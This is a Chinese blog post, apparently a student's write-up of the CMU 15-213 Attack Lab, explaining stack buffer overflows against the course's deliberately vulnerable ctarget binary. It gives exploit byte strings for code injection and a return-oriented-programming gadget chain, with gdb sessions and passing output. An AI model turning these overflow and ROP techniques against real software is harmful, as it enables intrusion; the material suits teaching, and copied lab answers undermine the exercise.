@@ -1,0 +1,846 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Consolas:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-bounce.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"csodyssey.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="利用缓冲区溢出漏洞来修改二进制可执行文件的运行时行为。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="缓冲区溢出漏洞攻击实验">
+<meta property="og:url" content="http://csodyssey.github.io/2023/03/09/attacklab/index.html">
+<meta property="og:site_name" content="A CS Student&#39;s Odyssey">
+<meta property="og:description" content="利用缓冲区溢出漏洞来修改二进制可执行文件的运行时行为。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-03-08T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-10-22T14:55:50.426Z">
+<meta property="article:author" content="小王(Comrade Wang)">
+<meta property="article:tag" content="体系结构">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://csodyssey.github.io/2023/03/09/attacklab/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>缓冲区溢出漏洞攻击实验 | A CS Student's Odyssey</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">A CS Student's Odyssey</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://csodyssey.github.io/2023/03/09/attacklab/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="小王(Comrade Wang)">
+      <meta itemprop="description" content="喜欢造飞机、导弹和计算机的大学生 (A graduate student who enjoys buidling airplanes, missiles and computers)">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="A CS Student's Odyssey">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          缓冲区溢出漏洞攻击实验
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-03-09 00:00:00" itemprop="dateCreated datePublished" datetime="2023-03-09T00:00:00+08:00">2023-03-09</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-10-22 22:55:50" itemprop="dateModified" datetime="2023-10-22T22:55:50+08:00">2023-10-22</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" itemprop="url" rel="index"><span itemprop="name">计算机基础知识</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/" itemprop="url" rel="index"><span itemprop="name">体系结构</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+            <div class="post-description">利用缓冲区溢出漏洞来修改二进制可执行文件的运行时行为。</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="缓冲区溢出漏洞攻击实验"><a href="#缓冲区溢出漏洞攻击实验" class="headerlink" title="缓冲区溢出漏洞攻击实验"></a>缓冲区溢出漏洞攻击实验</h1><p>该实验的内容主要为利用一个缓冲区溢出漏洞，来修改一个二进制可执行文件的运行时行为，将栈中调用函数的返回地址修改成另一个函数的起始地址来执行自己的代码。</p>
+<h2 id="预备知识："><a href="#预备知识：" class="headerlink" title="预备知识："></a>预备知识：</h2><p>有如下函数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">echo</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">18</span>];</span><br><span class="line">  gets(buf);</span><br><span class="line">  <span class="built_in">puts</span>(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>当调用者函数调用echo()时，栈中的内容如下：</p>
+<table>
+<thead>
+<tr>
+<th>地址</th>
+<th>内容</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>%rsp + 0x2c</td>
+<td>caller函数的栈帧</td>
+</tr>
+<tr>
+<td>%rsp + 0x24</td>
+<td><strong>Return Address</strong></td>
+</tr>
+<tr>
+<td>……</td>
+<td></td>
+</tr>
+<tr>
+<td>%rsp + 0x08</td>
+<td>未使用的栈区</td>
+</tr>
+<tr>
+<td>buf &#x3D; %rsp</td>
+<td>[0][1][2][3][4][5][6][7]</td>
+</tr>
+</tbody></table>
+<p>由于Gets()函数不检查输入字符串的长度，因此可以输入任意长度的字符串，最后覆盖%rsp + 0x24 处的返回地址，进而修改可执行文件的运行行为。如果Return Address的值为某个函数的起始地址，就可以执行自己的代码。</p>
+<h2 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h2><p>将Gets函数的返回地址从getbuf()函数改为touch1()函数。<br>执行Gets()时的内存地址：</p>
+<table>
+<thead>
+<tr>
+<th>地址</th>
+<th>内容</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>%rsp + 0x28</td>
+<td>getbuf</td>
+</tr>
+<tr>
+<td>%rsp + 0x20</td>
+<td></td>
+</tr>
+<tr>
+<td>%rsp + 0x18</td>
+<td></td>
+</tr>
+<tr>
+<td>%rsp + 0x10</td>
+<td></td>
+</tr>
+<tr>
+<td>%rsp + 0x08</td>
+<td></td>
+</tr>
+<tr>
+<td>%rsp + 0x00</td>
+<td></td>
+</tr>
+</tbody></table>
+<p>要将%rsp + 0x28处的地址从getbuf改为touch1的地址。<br>现通过反汇编，通过汇编程序查看touch1的地址：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdum -d -x ./ctarget &gt; ctarget.asm</span><br></pre></td></tr></table></figure>
+<p>发现为0x00000000004017c0，因此写入的字符串可以是：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">c0 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
+<p>只用保证0x28偏移处的值依次为0xc0、0x17、0x40即可。<br>运行结果：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">./hex2raw &lt; ans1.txt | ./ctarget -q</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch1!: You called touch1()</span><br><span class="line">Valid solution for level 1 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">	user id	bovik</span><br><span class="line">	course	15213-f15</span><br><span class="line">	lab	attacklab</span><br><span class="line">	result	1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00 </span><br></pre></td></tr></table></figure>
+
+
+<h2 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h2><p>将Gets函数的返回地址从getbuf()函数改为touch2()函数，并且touch2()函数的参数为cookie值，保存在%rsp中。<br>这道题需要自己写一段代码，Gets()函数获取的字符串包含需要执行的代码。首先，执行Gets()时的内存地址：</p>
+<table>
+<thead>
+<tr>
+<th>地址</th>
+<th>内容</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>%rsp + 0x28</td>
+<td>getbuf</td>
+</tr>
+<tr>
+<td>%rsp + 0x20</td>
+<td></td>
+</tr>
+<tr>
+<td>%rsp + 0x18</td>
+<td></td>
+</tr>
+<tr>
+<td>%rsp + 0x10</td>
+<td></td>
+</tr>
+<tr>
+<td>%rsp + 0x08</td>
+<td></td>
+</tr>
+<tr>
+<td>%rsp + 0x00</td>
+<td></td>
+</tr>
+</tbody></table>
+<p>我们希望将%rsp + 0x28处的getbuf地址改为%rsp，使用gdb查看此刻%rsp的值。getbuf函数如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">00000000004017a8 &lt;getbuf&gt;:</span><br><span class="line">  4017a8:	48 83 ec 28          	sub    $0x28,%rsp</span><br><span class="line">  4017ac:	48 89 e7             	mov    %rsp,%rdi</span><br><span class="line">  4017af:	e8 8c 02 00 00       	callq  401a40 &lt;Gets&gt;</span><br><span class="line">  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line">  4017b9:	48 83 c4 28          	add    $0x28,%rsp</span><br><span class="line">  4017bd:	c3                   	retq</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>需要在0x4017b9设置断点：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">linux&gt; </span><span class="language-bash">gdb ./ctarget</span></span><br><span class="line">(gdb) b *0x4017b9</span><br><span class="line">...</span><br><span class="line">(gdb) run -q</span><br><span class="line">...</span><br><span class="line">Breakpoint 1, 0x00000000004017b9 in getbuf () at buf.c:16</span><br><span class="line">(gdb) p/x $rsp</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">1 = 0x5561dc78</span></span><br></pre></td></tr></table></figure>
+<p>因此%rsp的值为0x5561dc78，需要将getbuf地址改成这个值，防止返回getbuf()函数，然后从%rsp指向地址处的代码功能为：先将cookie的值0x59b997fa存入%rdi寄存器，然后跳转到touch2函数处，跳转可以用<strong>push $addr</strong> + <strong>retq</strong>两条指令实现，代码应写成：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov $0x59b997fa, %rdi</span><br><span class="line">pushq $0x4017ec</span><br><span class="line">retq</span><br></pre></td></tr></table></figure>
+
+<p>栈帧中的内容：</p>
+<table>
+<thead>
+<tr>
+<th>栈帧</th>
+<th>地址</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0x5561dc78</td>
+<td>0x5561dca0</td>
+</tr>
+<tr>
+<td>…</td>
+<td></td>
+</tr>
+<tr>
+<td>…</td>
+<td></td>
+</tr>
+<tr>
+<td>ret</td>
+<td></td>
+</tr>
+<tr>
+<td>pushq $0x4017ec</td>
+<td></td>
+</tr>
+<tr>
+<td>mov $0x59b997fa, %rdi</td>
+<td>0x5561dc78</td>
+</tr>
+</tbody></table>
+<p>将上述代码翻译成二进制代码：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">linux&gt; </span><span class="language-bash">gcc -c ans2.s -o ans2.o</span></span><br><span class="line"><span class="meta prompt_">linux&gt; </span><span class="language-bash">objdump -d ans2.o</span></span><br><span class="line">...</span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi</span><br><span class="line">   7:	68 ec 17 40 00       	pushq  $0x4017ec</span><br><span class="line">   c:	c3                   	retq </span><br></pre></td></tr></table></figure>
+<p>因此答案为：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 fa 97 b9 59 68</span><br><span class="line">ec 17 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br></pre></td></tr></table></figure>
+<p>运行结果：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">linux&gt; </span><span class="language-bash">./hex2raw &lt; ans2.txt | ./ctarget -q</span></span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch2!: You called touch2(0x59b997fa)</span><br><span class="line">Valid solution for level 2 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">	user id	bovik</span><br><span class="line">	course	15213-f15</span><br><span class="line">	lab	attacklab</span><br><span class="line">	result	1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 </span><br></pre></td></tr></table></figure>
+
+<h2 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h2><p>在第二题基础上，返回地址从getbuf()函数改为touch3()函数，并且touch3()函数调用的hexmatch()函数返回正确的值，写入的内容除了上一题的mov、push和ret三条指令外，还需要向内存写入字符串，进入hexmatch()函数前将%rdi的值指向字符串。<br>执行到touch3()函数时，栈帧如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(gdb) p/x $rsp</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">1 = 0x5561dca8</span></span><br><span class="line">(gdb) x/16 $rsp - 0x30</span><br><span class="line">0x5561dc78:	0xa8c7c748	0x685561dc	0x004018fa	0x000000c3</span><br><span class="line">0x5561dc88:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x5561dc98:	0x00000000	0x00000000	0x004018fa	0x00000000</span><br><span class="line">0x5561dca8:	0x39623935	0x61663739	0x00000000	0x00000000</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>地址</th>
+<th>内容</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0x..dca0</td>
+<td>touch3首地址</td>
+</tr>
+<tr>
+<td>0x..dc98</td>
+<td></td>
+</tr>
+<tr>
+<td>0x..dc90</td>
+<td></td>
+</tr>
+<tr>
+<td>0x..dc88</td>
+<td></td>
+</tr>
+<tr>
+<td>0x..dc80</td>
+<td>push &amp; ret</td>
+</tr>
+<tr>
+<td>0x..dc78</td>
+<td>mov</td>
+</tr>
+</tbody></table>
+<p>执行hexmatch时，栈帧如下所示：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(gdb) p/x $rsp</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">4 = 0x5561dc98</span></span><br><span class="line">(gdb) x/20 $rsp - 0x30</span><br><span class="line">0x5561dc68:	0x00000002	0x00000000	0x004017b4	0x00000000</span><br><span class="line">0x5561dc78:	0xa8c7c748	0x685561dc	0x004018fa	0x000000c3</span><br><span class="line">0x5561dc88:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x5561dc98:	0x00401916	0x00000000	0x55586000	0x00000000</span><br><span class="line">0x5561dca8:	0x39623935	0x61663739	0x00000000	0x00000000</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>地址</th>
+<th>内容</th>
+<th>栈指针</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0x..dca0</td>
+<td>0x….</td>
+<td></td>
+</tr>
+<tr>
+<td>0x..dc98</td>
+<td>touch3返回地址</td>
+<td>&lt;-%rsp</td>
+</tr>
+<tr>
+<td>0x..dc90</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>0x..dc88</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>0x..dc80</td>
+<td>push &amp; ret</td>
+<td></td>
+</tr>
+<tr>
+<td>0x..dc78</td>
+<td>mov</td>
+<td></td>
+</tr>
+</tbody></table>
+<p>由于执行hexmatch函数时，栈区会管理临时变量，因此字符串的内容不能写在0x..dca0以下的地方，否则会被hexmatch函数的临时变量覆盖掉，因此，可以写在test()的栈帧里，也就是0x5561dca8处，因此第三题写入的内容可以是：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 a8 dc 61 55 68</span><br><span class="line">fa 18 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br><span class="line">35 39 62 39 39 37 66 61</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line"></span><br><span class="line">/* cookie: 0x59b997fa */</span><br><span class="line">/* touch3(): 0x4018fa */</span><br><span class="line">/*</span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:	48 c7 c7 a8 dc 61 55 	mov    $0x5561dca8,%rdi</span><br><span class="line">   7:	68 fa 18 40 00       	pushq  $0x4018fa</span><br><span class="line">   c:	c3                   	retq</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>
+
+<h2 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h2><p>这一关是Return Oriented Programming (ROP)攻击，在ROP攻击中设置了栈随机化，所以不能像前面三个实验一样在确定的地址处插入代码。为了实现攻击，我们要在已经给定的代码中找到特定的指令序列，这些序列以ret结尾，我们把这些命令叫做gadget。</p>
+<p>每一段gadget包含一系列指令字节，而且以ret结尾，跳转到下一个gadget，就这样连续的执行一系列的指令代码，对程序造成攻击。譬如给的示例:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">setval_210</span><span class="params">(<span class="type">unsigned</span> *p)</span></span><br><span class="line">&#123;</span><br><span class="line">  *p = <span class="number">3347663060U</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>反汇编后得到它的指令字节编码:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0000000000400f15 &lt;setval_210&gt;:</span><br><span class="line">  400f15: c7 07 d4 48 89 c7 movl $0xc78948d4,(%rdi)</span><br><span class="line">  400f1b: c3 retq</span><br></pre></td></tr></table></figure>
+
+<p>这样我们就可以利用已经存在的程序，从中间提取出特殊的指令，得到一个gadget，每一段gadget包含一系列指令字节，而且以ret结尾，跳转到下一个gadget，就这样连续的执行一系列的指令代码。</p>
+<p>为了让函数跳转到touch2()并且%rdi的值为cookie值，并且题目说需要使用到popq指令以及两个gadgets，因此推测这两个gadgets可能将栈里面写入的cookie值弹出到寄存器里面，再通过retq指令弹出栈里面的下一个gadget的地址，然后跳转到下一个gadget执行寄存器传送操作，再执行retq指令将栈里面的touch2()地址弹出，跳转到touch2()函数处执行。<br>题目说了gadget的范围在start_farm和mid_farm之间，观察他们之间的farm，可以看到下面两个gadget可以构成如上的功能：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00000000004019a0 &lt;addval_273&gt;:</span><br><span class="line">  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax     // mov %rax, %rdi; retq</span><br><span class="line">  4019a6:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">00000000004019a7 &lt;addval_219&gt;:</span><br><span class="line">  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax     // popq %rax; nop; retq</span><br><span class="line">  4019ad:	c3                   	retq   </span><br></pre></td></tr></table></figure>
+
+<p>先执行第二个gadget，再跳转到第一个gadget执行，然后执行touch2()函数。因此执行Gets()函数时，栈帧中的内容如下所示：</p>
+<table>
+<thead>
+<tr>
+<th>栈帧内容</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>touch2: 0x4017ex</td>
+</tr>
+<tr>
+<td>第1个gadget地址: 0x4019a2</td>
+</tr>
+<tr>
+<td>cookie: 0x59b997fa</td>
+</tr>
+<tr>
+<td>第2个gadget地址: 0x4019ab</td>
+</tr>
+<tr>
+<td>…</td>
+</tr>
+<tr>
+<td>…</td>
+</tr>
+<tr>
+<td>…</td>
+</tr>
+<tr>
+<td>…</td>
+</tr>
+<tr>
+<td>输入字符串的起始地址</td>
+</tr>
+</tbody></table>
+<p>答案为：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">ab 19 40 00 00 00 00 00</span><br><span class="line">fa 97 b9 59 00 00 00 00</span><br><span class="line">a2 19 40 00 00 00 00 00</span><br><span class="line">ec 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/" rel="tag"># 体系结构</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/03/04/bomblab/" rel="prev" title="二进制炸弹实验（逆向工程）">
+      <i class="fa fa-chevron-left"></i> 二进制炸弹实验（逆向工程）
+    </a></div>
+      <div class="post-nav-item">
